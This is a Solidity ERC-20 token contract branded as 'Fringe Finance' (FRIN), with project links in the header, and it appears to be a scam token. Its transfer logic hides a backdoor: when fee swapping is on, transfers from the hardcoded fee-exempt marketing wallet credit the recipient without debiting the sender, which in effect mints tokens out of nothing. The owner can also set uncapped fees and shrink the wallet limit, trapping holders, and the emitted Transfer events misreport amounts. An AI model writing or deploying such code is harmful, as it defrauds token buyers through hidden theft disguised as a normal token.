// SPDX-License-Identifier: MIT

/**
A safe place for you to invest and borrow against your holdings.
Fast, easily and on your own terms.

Website: https://www.fringefinance.org
Telegram: https://t.me/frinfi_erc
Twitter: https://twitter.com/frinfi_erc
Dapp: https://app.fringefinance.org
 */

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address uniswapPair);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }  
    event OwnershipTransferred(address owner);
}

contract FRIN is IERC20, Ownable {
    using SafeMath for uint256;

    string constant _name = "Fringe Finance";
    string constant _symbol = "FRIN";
    uint8 constant _decimals = 9;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) _isFeeExempt;
    mapping (address => bool) _isMaxTxExempt;

    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address deadAddress = 0x000000000000000000000000000000000000dEaD;

    uint256 _totalSupply = 10 ** 9 * (10 ** _decimals);
    uint256 _lpFee = 0; 
    uint256 _mktFee = 25;
    uint256 _tFee = _lpFee + _mktFee;
    uint256 _denominator = 100;
    uint256 public maxTxAmount = (_totalSupply * 18) / 1000;
    address public marketingWallet;
    IUniswapRouter public uniswapRouter;
    address public uniswapPair;
    bool public feeSwapEnabled = false;
    uint256 public feeSwapThreshold = _totalSupply / 100000; // 0.1%
    bool _inswap;
    modifier lockSwap() { _inswap = true; _; _inswap = false; }

    constructor () Ownable(msg.sender) {
        uniswapRouter = IUniswapRouter(routerAddress);
        uniswapPair = IUniswapFactory(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;
        address _owner = owner;
        marketingWallet = 0xD80AfdadFe1377C7C71054e28330241147F314FC;
        _isFeeExempt[marketingWallet] = true;
        _isMaxTxExempt[_owner] = true;
        _isMaxTxExempt[marketingWallet] = true;
        _isMaxTxExempt[deadAddress] = true;
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function takeFees(address sender, uint256 amount) internal returns (uint256) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 feeAmount = amount.mul(_tFee).div(_denominator);
        if (shouldChargeFee(sender) && !feeSwapEnabled) {
            feeAmount = 0;
        }
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }
    
    function shouldChargeFee(address sender) internal view returns (bool) {
        return !_isFeeExempt[sender];
    }

    function setMaxWallet(uint256 amountPercent) external onlyOwner {
        maxTxAmount = (_totalSupply * amountPercent ) / 1000;
    }

    function setFeeSwapEnabled(bool value) external onlyOwner {
        feeSwapEnabled = value;
    }

    function shouldSwap() internal view returns (bool) {
        return !_inswap
        && feeSwapEnabled
        && _balances[address(this)] >= feeSwapThreshold;
    }
    
    function swapAndLiquidify() internal lockSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 amountToLiquify = contractTokenBalance.mul(_lpFee).div(_tFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        uint256 balanceBefore = address(this).balance;

        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = _tFee.sub(_lpFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(_lpFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(_mktFee).div(totalETHFee);


        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingWallet).call{value: amountETHMarketing, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");

        if(amountToLiquify > 0){
            uniswapRouter.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingWallet,
                block.timestamp
            );
        }
    }

    function _transferStandard(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    
    function setFees(uint256 liquidityFee_, uint256 marketingFee_) external onlyOwner {
         _lpFee = liquidityFee_; 
         _mktFee = marketingFee_;
         _tFee = _lpFee + _mktFee;
    }    
    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(_inswap){ return _transferStandard(sender, recipient, amount); }
        
        if (recipient != uniswapPair && recipient != deadAddress) {
            require(_isMaxTxExempt[recipient] || _balances[recipient] + amount <= maxTxAmount, "Transfer amount exceeds the bag size.");
        }        
        if(shouldSwap() && shouldChargeFee(sender) && recipient == uniswapPair && amount > feeSwapThreshold){ 
            swapAndLiquidify(); 
        } 
        bool shouldTax = shouldChargeFee(sender) || !feeSwapEnabled;
        if (shouldTax) {
            _balances[recipient] = _balances[recipient].add(takeFees(sender, amount));
        } else {
            _balances[recipient] = _balances[recipient].add(amount);
        }

        emit Transfer(sender, recipient, amount);
        return true;
    }
}